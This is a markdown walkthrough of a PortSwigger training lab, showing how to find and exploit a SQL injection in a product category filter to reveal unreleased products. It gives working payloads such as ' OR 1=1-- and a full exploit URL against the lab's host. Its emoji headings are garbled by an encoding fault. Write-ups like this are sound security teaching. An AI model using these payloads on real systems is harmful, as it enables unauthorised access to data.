# üîç SQL Injection Lab Walkthrough

## üè∑Ô∏è Lab: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data

üîó [Lab Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data)

## üß† Objective:

The goal is to exploit a SQL injection vulnerability in the product category filter to **display unreleased products**.

## üïµÔ∏è‚Äç‚ôÇÔ∏è Step-by-Step Discovery

### 1\. **Intercept the Request Using Burp Suite**

  - Open **Burp Suite** and make sure your browser is configured to route traffic through it.
  - Visit the vulnerable URL, for example:
    ```
    https://0af600900457a8bd80613a6b000d00aa.web-security-academy.net/filter?category=Gifts
    ```
  - Use **Proxy \> Intercept** to capture the request before it reaches the server.

### 2\. **Identify Injection Point**

  - The parameter `category` appears to be directly used in a SQL query like:
    ```sql
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1
    ```

### 3\. **Test for SQL Injection**

  - Modify the `category` parameter to inject a single quote `'`:
    ```
    category=Gifts'
    ```
  - Send the modified request and observe the response.
  - If there‚Äôs an SQL error (e.g., malformed query or internal server error), it confirms the input is vulnerable.


## üí• Exploitation ‚Äì Solving the Lab


### ‚úÖ Goal: Show both released and **unreleased** products.

#### üß™ Payload Explanation:

You want to bypass the `AND released = 1` condition.

#### Common working payload:

```
category=Gifts' OR 1=1--
```

This changes the query to:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1
```

Because `--` comments out the rest of the line, the effective query becomes:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1
```

Since `1=1` is always true, this returns **all products**, including those where `released = 0`.

## üõ†Ô∏è Final Exploit URL:

```
https://0af600900457a8bd80613a6b000d00aa.web-security-academy.net/filter?category=Gifts%27+OR+1=1--
```

> ‚úÖ Replace with your actual lab URL if different.

## üß© My Approach (More Targeted)

As we know there is an checkpoint called `released` so set to '1' and '0'

```
category=Gifts' OR released = 1 OR released = 0--
```

Or a more inclusive version:

```
category='%20OR%20released=1%20OR%20released=0--
```

Which translates to:

```sql
SELECT * FROM products WHERE category = '' OR released=1 OR released=0
```

Effectively showing all products regardless of release status.


## ü§ù Community Solutions (Summary)

Here are some common approaches seen from other solvers in forums and write-ups:

| Approach | Description |
|---|---|
| `' OR 1=1--` | Classic payload that bypasses the `WHERE` clause filtering. |


## üéØ Lab Solved\!

Once you submit the payload and see unreleased products appear in the response, the lab will mark as solved ‚úÖ

## ‚ö†Ô∏è Important Note:

Even though these payloads seem harmless, injecting `OR 1=1` into queries could unintentionally affect other parts of the application ‚Äî especially if the same input is reused elsewhere (e.g., DELETE or UPDATE statements). Always test responsibly\!

---